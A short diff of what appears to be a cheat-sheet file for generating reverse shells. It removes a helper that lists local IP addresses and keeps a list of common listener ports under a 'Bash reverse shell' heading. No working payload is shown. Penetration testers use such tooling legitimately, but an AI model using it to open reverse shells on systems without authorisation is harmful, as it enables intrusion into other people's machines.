@@ -1,6 +1,5 @@
 % rev shells generated from github/mthbernardes/rsg
 
-$ IP: for adaptername in $(for i in "$(ip a s | sort -r | grep -E $'[[:digit:]]:[ ]')"; do echo $(echo $i | awk '{print $2}' | replace : ''); done); do ip a s $adaptername | grep 'inet\ ' | awk '{print $2}' | cut -d '/' -f 1 ; done | uniq
 $ port: echo '9001 443 1234 4444 32000' | tr ' ' '\n'
 
 # Bash reverse shell
